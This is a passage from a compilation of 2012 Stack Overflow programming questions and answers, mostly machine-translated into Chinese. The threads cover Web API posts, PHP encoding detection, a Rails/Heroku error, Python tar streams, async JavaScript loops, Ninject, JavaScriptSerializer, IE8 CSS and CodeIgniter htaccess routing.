这样，我们只会调用`PostPassword`发送密码到`ApiController`。在客户端，只有一个 Ajax 调用。它在我们将进行更新的服务器上。好处当然是减少了通过 Internet 传输的数据。

如果可能的话，将所有不同`POST`的调用定向到它们的相应操作的正确方法是什么`ApiController`？

请帮助我们。谢谢你们。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T18:01:46.087

我认为，在大多数情况下，无需进行多次发布操作。典型案例是消费者需要编辑用户。因此，她/他需要先加载用户数据以显示在编辑表单上。编辑完成后，消费者可以点击保存按钮提交数据并在 api 控制器上调用 POST 操作。

如果您的情况不同，则值类型应该具有可为空的属性，然后应在控制器中检查的逻辑是，如果任何属性为空，则不应将此属性更新到数据库中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:41:54.423

You can only have one post action per controller action name. That is, you cannot do

```
// NOT VALID:
public ActionResult UpdateUser(string newPassword) { }
public ActionResult UpdateUser(List<string> newRoles) { } 
```

However, parameters of the action can certainly be nullable. If a given property is not supplied in a given HTTP request, the value of the property in the controller would be null.

```
// VALID:
public ActionResult UpdateUser(string newPassword, List<string> newRoles) 
{ 
    if (newPassword != null) { } // It must have been supplied
    if (newRoles != null) { } // It must have been supplied
} 
```

Alternatively, you can have related controller actions that each handle one of your use cases, e.g. UpdatePassword(...), UpdateAddress(...), ...

# php - PHP 中“mb_detect_encoding()”的首选字符编码顺序是什么？

> ID：11782898
> 
> 赞同：1
> 
> 时间：2012-08-02T17:40:20.053
> 
> 标签：php, utf-8, character-encoding, mbstring

作为 . 的第二个参数传递的首选字符编码顺序是什么`mb_detect_encoding( )`？

我问这个是因为某些字符编码与其他字符编码重叠，例如 ASCII 为 UTF（在某些情况下）返回，EUC-CN 为 gb2312，以及 EUC-CN、EUC-JP、EUC-KR、EUC-TW 中的任何一个，以较早出现的为准传递给函数的序列返回简体中文 EUC-CN 兼容字符串。

这是我收集的一些，但我想让列表尽可能全面。

```
EUC-CN
EUC-JP
EUC-KR
EUC-TW
SJIS
ASCII
JIS
UTF-8
EUC-JP
EUC-CN
EUC-KR
EUC-TW
SJIS 
```

请帮助我更正订单并使此列表尽可能大。

**编辑1：**

我想做的就是将任何字符串转换为utf8。

**编辑2：**

考虑到以下建议，我想尽量减少在编码转换中浪费文本的可能性，因为转换后的文本是我的网站唯一依赖的东西。所以，即使我使用的解决方案不是完美的。请您演示最可靠的解决方案吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T17:49:27.940

没有真正的首选顺序可以为您提供最准确的响应。

在许多字符集中总会有可能被检测到并且有效的字符串。mb_detect_encoding 无法确定哪个是正确的。

解决此问题的唯一方法是：

1.  让懂语言的人选择正确的编码。
2.  潜在地分析字符串中的实际文本，并“猜测”最有可能是正确的。

对于第二个我不知道现成的选项，但我可以想象诸如字符出现率、贝叶斯过滤器、神经网络和字典检查之类的东西可能很有用；）

# ruby-on-rails-3 - Rails 3.2.5 - 多模型嵌套表单，Heroku NoMethodError

> ID：11782903
> 
> 赞同：2
> 
> 时间：2012-08-02T17:41:02.810
> 
> 标签：ruby-on-rails-3, heroku, associations, has-many-through, nested-form-for

我一直在寻找答案，但我处于停滞状态。一切都适用于我的本地开发环境，但一切都在生产（Heroku）上爆炸。使用相同的数据库（postgres）。即使我不相信我曾经发送过该方法，Heroku 也会炸毁 NoMethodError。

我有主要的 3 个模型（附加连接模型），一个嵌套表单具有 has_many :through 提交给所有三个模型，以及 Static_Pages#signup （充当新操作）和 Subscriptions_Controller#create 问题发生的地方。

**楷模**

```
class Location < ActiveRecord::Base
  attr_accessible :address_line_2, :city, :lat, :long, :name, :state, :street_address, :website, :zip, :phone_number, :user_id
  has_many :relationships
  has_many :users, :through => :relationships
end

class User < ActiveRecord::Base
  has_one :subscription
  has_one :plan, :through => :subscription
  has_many :relationships
  has_many :locations, :through => :relationships
  devise :database_authenticatable, :registerable,
     :recoverable, :rememberable, :trackable, :validatable
  attr_accessible :first_name, :last_name, :email, :password, 
              :password_confirmation, :remember_me, :stripe_token,
              :phone_number,:location
end

class Subscription < ActiveRecord::Base
  attr_accessor :stripe_card_token
  attr_accessible :card_expiration, :card_type, :card_zip, 
                 :current_period_end, :current_period_start, :last_four, 
                 :next_bill_on, :plan_id, :status, :stripe_customer_token, 
                 :trial_end, :trial_start, :user_id
  belongs_to :plan
  belongs_to :user
end

class Relationship < ActiveRecord::Base
  belongs_to :user
  belongs_to :location
end 
```

**控制器**

```
class StaticPagesController < ApplicationController
 def home
 end

 def signup
    @user           = User.new
    @plan           = Plan.find_by_identifier("basic_monthly")
    @location       = @user.locations.build
    @subscription   = Subscription.new
 end

 def thankyou
 end
end

class SubscriptionsController < ApplicationController
 def create
   @subscription        = Subscription.new params[:subscription]
   @user                = User.create! params[:user]
   @subscription.user      = @user
   @user.locations << Location.create!(params[:location])
   @plan = Plan.find params[:subscription][:plan_id]
    if @subscription.save
      redirect_to thankyou_path
    else
      render template: 'static_pages#signup'
    end
  end
end 
```

**注册表单**

```
<%= form_for @user, :url => subscriptions_path(@user) do |user_form| %>
  First name            : <%= user_form.text_field :first_name %><br />
  Last name             : <%= user_form.text_field :last_name %><br />
  Email                 : <%= user_form.email_field :email %><br />
  Phone Number          : <%= user_form.phone_field :phone_number %><br />
  Password              : <%= user_form.password_field :password %><br />
  Password Confirmation : <%= user_form.password_field :password_confirmation %><br />

  <%= fields_for @location do |location_fields| %>
    Business Name       : <%= location_fields.text_field :name %><br />
    Street Address      : <%= location_fields.text_field :street_address %><br />
    Address Line 2      : <%= location_fields.text_field :address_line_2 %><br />
    City                : <%= location_fields.text_field :city %><br />
    State               : <%= location_fields.text_field :state %><br />
    Zip                 : <%= location_fields.text_field :zip %><br />
    Website             : <%= location_fields.url_field :website %><br /><br />
  <% end %>

  <%= fields_for @subscription do |subscription_field| %>
    <%= subscription_field.hidden_field :plan_id, value: @plan.id  %>
  <% end %>

  <%= user_form.submit "Sign up", :class => 'btn primary large' %>
<% end %> 
```

最后... Heroku 日志抛出的错误（同样，这在我的本地机器上运行良好） **Heroku 错误 - 已更新**

```
2012-08-03T21:06:30+00:00 app[web.1]: Started GET "/signup" for 72.177.139.69 at 2012-08-03 21:06:30 +0000
2012-08-03T21:06:30+00:00 app[web.1]: Processing by StaticPagesController#signup as HTML
2012-08-03T21:06:30+00:00 app[web.1]:   Plan Load (1.3ms)  SELECT "plans".* FROM "plans" WHERE "plans"."identifier" = 'basic_monthly' LIMIT 1
2012-08-03T21:06:30+00:00 app[web.1]:   Rendered static_pages/signup.html.erb within layouts/application (8.0ms)
2012-08-03T21:06:30+00:00 app[web.1]:   Rendered layouts/_shim.html.erb (0.0ms)
2012-08-03T21:06:30+00:00 app[web.1]:   Rendered layouts/_navigation.html.erb (1.3ms)
2012-08-03T21:06:30+00:00 app[web.1]:   Rendered layouts/_messages.html.erb (0.1ms)
2012-08-03T21:06:30+00:00 app[web.1]:   Rendered layouts/_footer.html.erb (0.2ms)
2012-08-03T21:06:30+00:00 app[web.1]:   Rendered layouts/_analytics.html.erb (0.0ms)
2012-08-03T21:06:30+00:00 app[web.1]: Completed 200 OK in 458ms (Views: 52.2ms | ActiveRecord: 76.5ms)
2012-08-03T21:06:30+00:00 heroku[router]: GET www.myappname.com/signup dyno=web.1 queue=0 wait=0ms service=470ms status=200 bytes=7555
2012-08-03T21:07:02+00:00 app[web.1]: 
2012-08-03T21:07:02+00:00 app[web.1]: 
2012-08-03T21:07:02+00:00 app[web.1]: Started POST "/subscriptions" for 72.177.139.69 at           2012-08-03 21:07:02 +0000
2012-08-03T21:07:03+00:00 app[web.1]: 
2012-08-03T21:07:03+00:00 app[web.1]: NoMethodError (undefined method `name' for #<User:0x00000003f13a30>):
2012-08-03T21:07:03+00:00 app[web.1]:   app/controllers/subscriptions_controller.rb:5:in `create'
2012-08-03T21:07:03+00:00 app[web.1]: 
2012-08-03T21:07:03+00:00 app[web.1]: 
2012-08-03T21:07:03+00:00 app[web.1]: Processing by SubscriptionsController#create as HTML
2012-08-03T21:07:03+00:00 app[web.1]:   Parameters: {"utf8"=>"✓", "authenticity_token"=>"ahRL7xz6NE72fxib+KxEX9BVue/NCmS1dSLXSv66alc=", "user"=>{"first_name"=>"Big", "last_name"=>"Boy", "email"=>"example@gmail.com", "phone_number"=>"123456", "password"=>"[FILTERED]", "password_confirmation"=>"[FILTERED]"}, "location"=>{"name"=>"Drew's American Grille", "street_address"=>"123 Physical Address", "address_line_2"=>"", "city"=>"San Antonio", "state"=>"Texas", "zip"=>"78209", "website"=>""}, "subscription"=>{"plan_id"=>"1"}, "commit"=>"Sign up"}
2012-08-03T21:07:03+00:00 app[web.1]:    (0.7ms)  BEGIN
2012-08-03T21:07:03+00:00 app[web.1]:   User Exists (1.5ms)  SELECT 1 FROM "users" WHERE "users"."email" = 'example@gmail.com' LIMIT 1
2012-08-03T21:07:03+00:00 app[web.1]:   CACHE (0.0ms)  SELECT 1 FROM "users" WHERE "users"."email" = 'example@gmail.com' LIMIT 1
2012-08-03T21:07:03+00:00 app[web.1]:    (0.6ms)  ROLLBACK
2012-08-03T21:07:03+00:00 app[web.1]: Completed 500 Internal Server Error in 100ms
2012-08-03T21:07:03+00:00 heroku[router]: POST www.myappname.com/subscriptions dyno=web.1 queue=0 wait=0ms service=134ms status=500 bytes=643
2012-08-03T21:07:03+00:00 heroku[router]: GET www.myappname.com/favicon.ico dyno=web.1 queue=0 wait=0ms service=5ms status=304 bytes=0 
```

如果需要，我可以上传架构，但本质上如下： **架构的迷你版**

```
users
 email
 first_name
 last_name
 phone_number
 <normal devise handlers>
 ...
subscriptions
 user_id
 plan_id
 ...
relationships
 user_id
 location_id
locations (all :null => false)
 name
 street_address
 city
 state
 zip
 ... 
```

**heroku run rake db:migrate 也不起作用** 它会引发“数据库配置未指定适配器”异常，但 Heroku 会覆盖 database.yml 文件，为什么会发生这种情况？

```
Running `rake db:migrate --trace` attached to terminal... up, run.1
** Invoke db:migrate (first_time)
** Invoke environment (first_time)
** Execute environment
** Invoke db:load_config (first_time)
** Invoke rails_env (first_time)
** Execute rails_env
** Execute db:load_config
** Execute db:migrate
** Invoke db:_dump (first_time)
** Execute db:_dump
** Invoke db:schema:dump (first_time)
** Invoke environment 
** Invoke db:load_config 
** Execute db:schema:dump
rake aborted!
database configuration does not specify adapter
/app/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.5/lib/active_record/connection_adapters/abstract/connection_specification.rb:45:in `resolve_hash_connection'
/app/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.5/lib/active_record/connection_adapters/abstract/connection_specification.rb:39:in `resolve_string_connection'
/app/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.5/lib/active_record/connection_adapters/abstract/connection_specification.rb:25:in `spec'
/app/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.5/lib/active_record/connection_adapters/abstract/connection_specification.rb:127:in `establish_connection'
/app/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.5/lib/active_record/railties/databases.rake:356:in `block (4 levels) in <top (required)>'
/app/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.5/lib/active_record/railties/databases.rake:355:in `open'
/app/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.5/lib/active_record/railties/databases.rake:355:in `block (3 levels) in <top (required)>'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/task.rb:205:in `call'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/task.rb:205:in `block in execute'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/task.rb:200:in `each'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/task.rb:200:in `execute'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/task.rb:158:in `block in invoke_with_call_chain'
/usr/local/lib/ruby/1.9.1/monitor.rb:201:in `mon_synchronize'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/task.rb:151:in `invoke_with_call_chain'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/task.rb:144:in `invoke'
/app/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.5/lib/active_record/railties/databases.rake:161:in `block (2 levels) in <top (required)>'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/task.rb:205:in `call'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/task.rb:205:in `block in execute'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/task.rb:200:in `each'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/task.rb:200:in `execute'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/task.rb:158:in `block in invoke_with_call_chain'
/usr/local/lib/ruby/1.9.1/monitor.rb:201:in `mon_synchronize'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/task.rb:151:in `invoke_with_call_chain'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/task.rb:144:in `invoke'
/app/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.5/lib/active_record/railties/databases.rake:156:in `block (2 levels) in <top (required)>'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/task.rb:205:in `call'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/task.rb:205:in `block in execute'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/task.rb:200:in `each'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/task.rb:200:in `execute'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/task.rb:158:in `block in invoke_with_call_chain'
/usr/local/lib/ruby/1.9.1/monitor.rb:201:in `mon_synchronize'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/task.rb:151:in `invoke_with_call_chain'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/task.rb:144:in `invoke'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/application.rb:116:in `invoke_task'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/application.rb:94:in `block (2 levels) in top_level'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/application.rb:94:in `each'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/application.rb:94:in `block in top_level'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/application.rb:133:in `standard_exception_handling'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/application.rb:88:in `top_level'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/application.rb:66:in `block in run'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/application.rb:133:in `standard_exception_handling'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/lib/rake/application.rb:63:in `run'
/app/vendor/bundle/ruby/1.9.1/gems/rake-0.9.2.2/bin/rake:33:in `<top (required)>'
/app/vendor/bundle/ruby/1.9.1/bin/rake:19:in `load'
/app/vendor/bundle/ruby/1.9.1/bin/rake:19:in `<main>'
Tasks: TOP => db:schema:dump 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-06T19:25:40.463

我犯了一个愚蠢的错误（在 Ruby 和一般编程中仍然是新手）。我有一个以前的模型`old_user.rb`，它与其他错误`class User < ActiveRecord::Base`发生冲突`user.rb`并产生了其他错误。出于某种原因，我猜我的开发机器上的加载顺序与 Heroku 的加载顺序不同，以及为什么我从未意识到这一点。

# tar - Creating a tar stream of arbitrary data and size

> ID：11782906
> 
> 赞同：3
> 
> 时间：2012-08-02T17:41:15.723
> 
> 标签：tar

I need to create an arbitrarily large tarfile for testing but don't want it to hit the disk.

What's the easiest way to do this?

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-02T17:41:15.723

You can easily use python to generate such a tarfile:

`mktar.py`:

```
#!/usr/bin/python

import datetime
import sys
import tarfile

tar = tarfile.open(fileobj=sys.stdout, mode="w|")

info = tarfile.TarInfo(name="fizzbuzz.data")
info.mode = 0644
info.size = 1048576 * 16
info.mtime = int(datetime.datetime.now().strftime('%s'))

rand = open('/dev/urandom', 'r')

tar.addfile(info,rand)
tar.close() 
```

* * *

```
michael@challenger:~$ ./mktar.py | tar tvf -
-rw-r--r-- 0/0        16777216 2012-08-02 13:39 fizzbuzz.data 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-07-04T08:16:27.027

You can use tar with -O option `tar -O`, like this `tar -xOzf foo.tgz bigfile | process`

[https://www.gnu.org/software/tar/manual/html_node/Writing-to-Standard-Output.html](https://www.gnu.org/software/tar/manual/html_node/Writing-to-Standard-Output.html)

PS: However, it could be, that you will not get the benefits you intend to gain as tar starts writing stdout only after it has read through the entire compressed file. You can demonstrate this behavior by starting a large file extraction and following the file size over time; it should be zero most of the processing time and start growing at very late stage. On the other hand I haven't researched this extensively, there might be some work around, or I might be just plain wrong with my first hand out-of-memory experience.

# javascript - 如何制作一个干净的异步循环？

> ID：11782914
> 
> 赞同：6
> 
> 时间：2012-08-02T17:41:36.437
> 
> 标签：javascript, ajax, rest, loops, asynchronous

按照典型的 REST 标准，我将资源分解为单独的端点和调用。这里讨论的主要两个对象是`List`和`Item`（当然，一个列表有一个项目列表，以及与之关联的一些其他数据）。

因此，如果用户想要检索他的列表，他可能会发出 Get 请求`api/Lists`

然后，用户可能想要获取其中一个列表中的项目，并从上一次调用中检索到的位置获取`api/ListItems/4`4 。`List.listId`

这一切都很好： 的`options.complete`属性`$.ajax`让我指向一个回调方法，因此我可以简化这两个事件。

但是，如果我想获取*所有*相关列表的元素，事情就会变得非常混乱。例如，假设我有一个名为的库函数`makeGetRequest`，它接收端点和回调函数，以使这段代码更清晰。简单地以天真的方式检索 3 个元素会导致：

```
var success1 = function(elements){
    var success2 = function(elements){
       makeGetRequest("api/ListItems/3", finalSuccess);
    }
    makeGetRequest("api/ListItems/2", success2);
}
makeGetRequest("api/ListItems/1", success1); 
```

**恶心！**这就是编程 101 中的那种东西，我们在手腕上拍了一下并指向循环。但是你怎么能用循环来做到这一点，而不必依赖外部存储呢？

```
for(var i : values){
    makeGetRequest("api/ListItems/" + i, successFunction);
}

function successFunction(items){
    //I am called i-many times, each time only having ONE list's worth of items!
} 
```

即使有了存储，我也必须知道*所有人*何时完成并检索了他们的数据，并调用一些主函数来检索所有收集的数据并对其进行处理。

有处理这个的做法吗？这个问题应该已经解决过很多次了...

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T17:48:34.167

尝试使用一堆端点参数：

```
var params = [];
var results [];

params.push({endpoint: "api/ListItems/1"});
params.push({endpoint: "api/ListItems/2"});
params.push({endpoint: "api/ListItems/3"});
params.push({endpoint: "api/ListItems/4"}); 
```

然后您可以在成功处理程序中使其递归：

```
function getResources(endPoint) {

   var options = {} // Ajax Options
   options.success = function (data) {
       if (params.length > 0) {
           results.push({endpoint: endpoint, data: data});
           getResources(params.shift().endpoint);
       }
       else {
          theMasterFunction(results)
       }
   }

   $.get(endPoint, options)
} 
```

你可以通过一个这样的调用来启动它：

```
getResources(params.shift().endpoint); 
```

**编辑：**

为了使所有内容保持自包含并超出全局范围，您可以使用函数并提供回调：

```
function downloadResources(callback) {

    var endpoints = [];
    var results [];

    endpoints.push({endpoint: "api/ListItems/1"});
    endpoints.push({endpoint: "api/ListItems/2"});
    endpoints.push({endpoint: "api/ListItems/3"});
    endpoints.push({endpoint: "api/ListItems/4"});

    function getResources(endPoint) {
        var options = {} // Ajax Options
        options.success = function (data) {
           if (endpoints.length > 0) {
               results.push({endpoint: endpoint, data: data});
               getResources(endpoints.shift().endpoint);
           }
           else {
              callback(results)
           }
        }
       $.get(endPoint, options)
    }

    getResources(endpoints.shift().endpoint);

} 
```

正在使用：

```
downloadResources(function(data) {
   // Do stuff with your data set
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T17:53:03.947

dmck 的答案可能是您最好的选择。但是，另一种选择是执行批量列表选项，以便您的 api 支持诸如 api/ListItems/?id=1&id=2&id=3 之类的请求。

如果这更符合您的个人审美，您也可以做一个 api 搜索端点。

# asp.net-mvc - 使用 Ninject 向 MVC 控制器提供用户特定的依赖项

> ID：11782915
> 
> 赞同：1
> 
> 时间：2012-08-02T17:41:38.490
> 
> 标签：asp.net-mvc, dependency-injection, ninject, ninject.web.mvc

我有一些控制器需要 Web 服务连接（MS Dynamics CRM 的一个实例`CrmService`），我希望控制器通过它们的构造函数接收它。必须使用基于当前登录用户身份的令牌设置 CRM 服务（当用户登录应用程序对 CRM 进行身份验证并可以将返回的令牌存储在 Session 中时）。

我不确定如何最好地使用依赖注入和 Ninject 来提供这个实例。`ToMethod()`Ninject Func<> 访问 FormsAuth/Session 以获取当前请求（如果经过身份验证则获取令牌）以创建适当的实例似乎有点垃圾。我也不确定如果用户未通过身份验证会发生什么 - 我不需要这些用户能够访问控制器，但控制器将在`[Authorize]`运行任何过滤器之前实例化，因此必须始终满足依赖关系. 从我读过的内容来看，返回 null 并不理想，无论如何我都必须更改 Ninject 配置才能做到这一点。

我在想也许控制器可以获得一个实例`ICrmServiceFactory`或其他东西，但如果控制器最终具有其他也直接依赖的依赖项`CrmService`（并且不想被传递给工厂），这对我没有帮助。

任何有关如何解决此问题的建议将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T17:57:12.447

我通常为 IPrincipal 设置一个绑定：

```
kernel.Bind<IPrincipal>().ToMethod(c => HttpContext.Current.User); 
```

这种方法从来没有真正遇到过问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-03T09:08:06.610

如果我正确理解了您的问题，那么您的控制器依赖于`CrmService`并且`CrmService`需要存储在会话中的一些令牌。

在这种情况下，您可以注入一个`CrmTokenProvider`to`CrmService`并向该类添加一个属性，该类在`CrmService`.

```
public class CrmService
{
    public CrmService(CrmTokenProvider tokenProvider)
    {
        this.tokenProvider = tokenProvider;
    }

    public void DoSomeWork() 
    {
        ...
        this.tokenProvider.Token;
        ...
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-15T12:06:47.740

我最终实现了如下：

```
private static void RegisterServices(IKernel kernel)
{
  kernel.Bind<CrmService>()
          .ToMethod(context =>
          {
            //return unauthenticated instance if user not logged in.
            if (!HttpContext.Current.User.Identity.IsAuthenticated) return new CrmService();

            return GetConnection(HttpContext.Current);

          })
          .InRequestScope();
}

private static CrmService GetConnection(HttpContext ctx)
{
   //get stuff out of session and return service
} 
```

# jquery - When to use JavaScriptSerializer jquery ajax & asp.net server side method

> ID：11782918
> 
> 赞同：2
> 
> 时间：2012-08-02T17:41:48.510
> 
> 标签：jquery, asp.net, json, javascriptserializer

when we send data from server side to client side then data is automatically serialize & converted to json format and jquery can highly parse that json.

## as a example

```
[WebMethod]
public static Person GetData()
{
   JavaScriptSerializer js = new JavaScriptSerializer();
   Person p1 = new Person();
   p1.firstName = "Rakki";
   p1.lastName = "Muthukumar";
   p1.technologies = new string[] { "IIS", "ASP.NET", "JavaScript", "AJAX" };
   return p1;
} 
```

this above trick works and data converted to json format and get back to client then

but i saw people use JavaScriptSerializer class to convert the data in json format and then send the whole json to client side to parse by jquery.

## a small sample for JavaScriptSerializer

```
[WebMethod]
public static string GetData()
{
JavaScriptSerializer js = new JavaScriptSerializer();
Person p1 = new Person();
p1.firstName = "Rakki";
p1.lastName = "Muthukumar";
p1.technologies = new string[] { "IIS", "ASP.NET", "JavaScript", "AJAX" };
string str = js.Serialize(p1);
} 
```

i just need to know why people use JavaScriptSerializer class to convert data in json format when data is automatically converted to json.

tell me the exact situation when one has to use JavaScriptSerializer to make data converted to json format.

please discuss this in detail....thanks

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T00:21:03.130

我认为这是一种编码习惯或一种定向思维，甚至通过 .NET 框架帮助我们完成了这一步。

但另一方面，我们通常认为客户端只接受一些字符串值，如 json、xml 或一些普通文本。可能在我们看来，它们是一种声音，C# 类型与 javascript 类型不兼容，我们需要先转换它们才能使用它们。而且，我们认为这是获得我们想要的结果的安全方法。

# css - IE8 Background Image Not Showing

> ID：11782919
> 
> 赞同：3
> 
> 时间：2012-08-02T17:41:49.920
> 
> 标签：css, internet-explorer, internet-explorer-8, background, background-image

I have an unordered list that uses background images. All's fine in Chrome & FF, but IE8 is presenting some issues. The background images simply don't load. How can I get them to show in IE8? Is this a background image issue?

```
<ul class="service-icons">
  <li>
    <a id="service-icon-routine" href="#">
      <span class="service-category-title">Routine Service</span>
    </a>
  </li>
</ul> 
```

Styles

```
ul.service-icons {
    list-style-type: none;
    width: 860px;
    margin-left: auto;
    margin-right: auto;
    padding: 0;
}

ul.service-icons li {
    display: inline-block;
    width: 157px !important;
    height: 140px;
    padding: .5em !important;
    margin-bottom: 1.5em;
}

ul.service-icons li a {
    padding: 0em 0em 6.7em 0em;
    width: 102px !important;
    display: block;
    height: 15px;    
    text-decoration: none;
    margin-left: 2.2em;
}

.service-category-title {
    display: block;
    padding-top: 120px;
    text-align: center;    
}

#service-icon-routine {
    background: url('http://i.imgur.com/LieBz.png');
    background-position: 0px 0px;
} 
```

Any help is appreciated!

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-08-04T23:08:44.070

让它 -ms-border-radius: 8px;

微软的毫秒

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:59:29.887

我认为使用 just 令人窒息`background`，因为它加载为

```
background-image: url("null"); 
```

将其更改为以下内容应该可以解决它：

```
#service-icon-routine { 
    background-image: url('http://i.imgur.com/LieBz.png'); 
    background-position: 0px 0px; 
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-31T14:22:05.400

只是为了解决这个问题，我遇到了一个drupal插件设置过滤器的问题，该过滤器必须在我的主css中脱离。在图像 css 上将过滤器设置为：

```
filter: ; 
```

那应该超越它。认为这可能会有所帮助

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-08-02T17:49:29.313

尝试这个：

```
background:url(http://i.imgur.com/LieBz.png) no-repeat; 
```

也可能有助于为#service-icon-routine 设置图像的高度和宽度

# php - codeigniter 2 url 路由 + htaccess 奇怪的查询字符串

> ID：11782926
> 
> 赞同：0
> 
> 时间：2012-08-02T17:42:08.617
> 
> 标签：php, .htaccess, routing, query-string, codeigniter-2

我的 Codeigniter 路由有问题，希望有人能提供帮助。路由在大多数情况下都可以正常工作，但在涉及子域时似乎会中断。我认为这与 htaccess 有关，但我真的完全不确定，希望有人能提供帮助。

如果我`mysite.co.uk/a-page/`按预期进行这项工作。

如果我`subdomain.mysite.co.uk`这样做也可以（我为子域加载了一个单独的 default_controller）。

如果有人按预期去`subdomain.mysite.co.uk/anything`这个404。

但是，如果错误地有人去`subdomain.mysite.co.uk/a-page/`这也应该 404 但它没有。相反，它更改为以下 URL：

```
http://www.subdomain.mysite.co.uk/index.php?/a-page/ 
```

然后加载“a-page”功能。我想要它到 404。奇怪的是探查器没有拾取上面的 URI。相反，它只是认为它是“一页”。

在我的配置中，我有以下内容：

```
$config['index_page'] = '';
$config['uri_protocol'] = 'AUTO';
$config['url_suffix'] = '/';
$config['permitted_uri_chars'] = 'a-z 0-9~%.:_\-'; 
```

我知道它并不理想，但对于子域检查，我在 routes.php 的底部执行以下操作

```
if(isset($_SERVER['HTTP_HOST'])){
    $currentURL = parse_url('http://' . $_SERVER['HTTP_HOST']);
    $urlHostPieces = explode('.', $currentURL['host']);
    $subdomainValue = $urlHostPieces[1]; // will either be a genuine value or the domain name
}else{
    $subdomainValue = DOMAIN;
}

if($subdomainValue !== DOMAIN){
    //is subdomain
    $route['default_controller'] = "controller/function/$subdomainValue";
} else{
    //everything else
    $route['default_controller'] = "controller/home";
} 
```

我正在使用 Fabdrol 的 htaccess，这在谷歌搜索时似乎很常见。但是，我添加了尾部斜杠的代码并强制 www。

```
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /

    #Removes access to the system folder by users.
    #Additionally this will allow you to create a System.php controller,
    #previously this would not have been possible.
    #'system' can be replaced if you have renamed your system folder.
    RewriteCond %{REQUEST_URI} ^system.*
    RewriteRule ^(.*)$ /index.php?/$1 [L]

    #When your application folder isn't in the system folder
    #This snippet prevents user access to the application folder
    #Submitted by: Fabdrol
    #Rename 'application' to your applications folder name.
    RewriteCond %{REQUEST_URI} ^application.*
    RewriteRule ^(.*)$ /index.php?/$1 [L]

    # this adds trailing slash
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_URI} !(.*)/$
    RewriteRule ^(.*)$ $1/ [R=301,L]

    #Checks to see if the user is attempting to access a valid file,
    #such as an image or css document, if this isn't true it sends the
    #request to index.php
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule ^(.*)$ index.php?/$1 [L]

    # Forces WWW
    RewriteCond %{HTTP_HOST} !^www\.
    RewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L]  

</IfModule>

<IfModule !mod_rewrite.c>
    # If we don't have mod_rewrite installed, all 404's
    # can be sent to index.php, and everything works as normal.

    ErrorDocument 404 /index.php
</IfModule> 
```

有什么想法可以对奇怪的变化进行 404 处理吗？另请阅读 uri_protocol 应该更改为 REQUEST_URI 但这也没有影响它。

